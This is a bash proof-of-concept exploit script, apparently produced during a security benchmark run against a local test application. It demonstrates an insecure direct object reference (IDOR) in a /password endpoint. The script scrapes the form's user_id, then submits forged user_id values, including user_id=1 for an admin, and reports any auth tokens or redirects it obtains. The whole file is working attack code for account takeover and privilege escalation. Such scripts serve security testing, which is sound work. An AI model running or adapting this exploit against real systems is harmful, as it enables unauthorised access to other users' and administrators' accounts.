#!/bin/bash
# POC: POC demonstrating IDOR vulnerability through user_id parameter manipulation in /password endpoint. Shows how an authenticated attacker can escalate privileges by modifying the user_id parameter to access other users' accounts.
# Target: ./repo
# Created: 2025-11-04T20:10:01.063Z
# Session: benchmark-XBEN-027-24-mhkzunic

# IDOR: Horizontal Privilege Escalation via User ID Parameter Manipulation
# This POC demonstrates how an attacker can modify the user_id parameter
# to gain access to other users' accounts

TARGET_URL="${1:-http://localhost:8080}"
USERNAME="${2:-test}"

echo "[*] IDOR Vulnerability POC - User ID Parameter Manipulation"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing endpoint: /password/$USERNAME"
echo ""

# Step 1: Get initial password form to understand the structure
echo "[+] Step 1: Fetching initial password form for user '$USERNAME'"
FORM_RESPONSE=$(curl -s -X GET "$TARGET_URL/password/$USERNAME" -H "Accept: text/html")

# Extract the actual user_id from the form
ACTUAL_USER_ID=$(echo "$FORM_RESPONSE" | grep -oP 'name="user_id"\s+value="\K[^"]+' | head -1)

if [ -z "$ACTUAL_USER_ID" ]; then
    echo "[-] Could not extract user_id from form. Response:"
    echo "$FORM_RESPONSE"
    exit 1
fi

echo "[+] Found actual user_id for '$USERNAME': $ACTUAL_USER_ID"
echo ""

# Step 2: Attempt normal authentication with correct user_id
echo "[+] Step 2: Testing NORMAL authentication with correct user_id ($ACTUAL_USER_ID)"
NORMAL_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/password/$USERNAME" \
    -d "username=$USERNAME&user_id=$ACTUAL_USER_ID&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

NORMAL_STATUS=$(echo "$NORMAL_RESPONSE" | head -1 | grep -oP '\d{3}')
NORMAL_TOKEN=$(echo "$NORMAL_RESPONSE" | grep -i "auth_token" | grep -oP 'auth_token[^;]*')

echo "[*] Normal auth response status: $NORMAL_STATUS"
if [ ! -z "$NORMAL_TOKEN" ]; then
    echo "[+] Received token: $NORMAL_TOKEN"
fi
echo ""

# Step 3: Attempt IDOR by changing user_id to another value
echo "[+] Step 3: Testing IDOR - Attempting authentication with DIFFERENT user_id"
DIFFERENT_USER_ID=$((ACTUAL_USER_ID - 1))
echo "[*] Trying user_id=$DIFFERENT_USER_ID (different from correct $ACTUAL_USER_ID)"

IDOR_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/password/$USERNAME" \
    -d "username=$USERNAME&user_id=$DIFFERENT_USER_ID&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

IDOR_STATUS=$(echo "$IDOR_RESPONSE" | head -1 | grep -oP '\d{3}')
IDOR_TOKEN=$(echo "$IDOR_RESPONSE" | grep -i "auth_token" | grep -oP 'auth_token[^;]*')

echo "[*] IDOR response status: $IDOR_STATUS"
if [ ! -z "$IDOR_TOKEN" ]; then
    echo "[!] VULNERABLE: Received auth token despite using different user_id!"
    echo "[!] Token with wrong user_id: $IDOR_TOKEN"
    echo "[+] This confirms IDOR vulnerability - user_id is not properly validated"
    IDOR_DETECTED=1
else
    echo "[-] No token received with modified user_id (response might still show 302)"
    # Check if 302 is still returned (which indicates potential bypass)
    if echo "$IDOR_RESPONSE" | head -1 | grep -q "302"; then
        echo "[!] VULNERABLE: HTTP 302 returned despite modified user_id"
        echo "[!] This indicates the server accepted the manipulated parameter"
        IDOR_DETECTED=1
    fi
fi
echo ""

# Step 4: Attempt IDOR with admin user_id (typically 1)
echo "[+] Step 4: Testing IDOR - Attempting escalation to admin (user_id=1)"
ADMIN_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/password/$USERNAME" \
    -d "username=$USERNAME&user_id=1&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded" 2>&1)

ADMIN_STATUS=$(echo "$ADMIN_RESPONSE" | head -1 | grep -oP '\d{3}')
ADMIN_TOKEN=$(echo "$ADMIN_RESPONSE" | grep -i "auth_token" | grep -oP 'auth_token[^;]*')

echo "[*] Admin escalation response status: $ADMIN_STATUS"
if [ ! -z "$ADMIN_TOKEN" ]; then
    echo "[!] CRITICAL: Received auth token with admin user_id=1!"
    echo "[!] Admin token: $ADMIN_TOKEN"
    IDOR_DETECTED=1
fi
echo ""

# Summary
echo "=============================================="
if [ "$IDOR_DETECTED" = "1" ]; then
    echo "[!] IDOR VULNERABILITY CONFIRMED"
    echo "[!] The user_id parameter is not properly validated"
    echo "[!] An attacker can manipulate this parameter to access other users"
    exit 0
else
    echo "[-] IDOR not detected in this run"
    exit 1
fi